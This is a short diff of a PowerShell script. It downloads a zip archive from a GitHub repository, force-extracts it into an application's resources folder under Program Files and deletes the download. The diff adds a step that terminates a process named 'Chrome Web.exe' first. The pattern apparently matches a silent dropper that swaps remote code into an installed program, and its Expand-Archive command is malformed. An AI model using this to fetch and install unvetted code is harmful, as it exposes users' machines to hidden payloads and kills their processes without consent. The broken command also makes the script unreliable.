@@ -3,6 +3,9 @@ measure-command {
 
 invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"
 
+#TASKILL
+Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
+#INSTALL FORCE
 Expand-Archive -Path -force C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"
 
 Remove-Item -Force -Recurse 'C:\Users\app.zip'
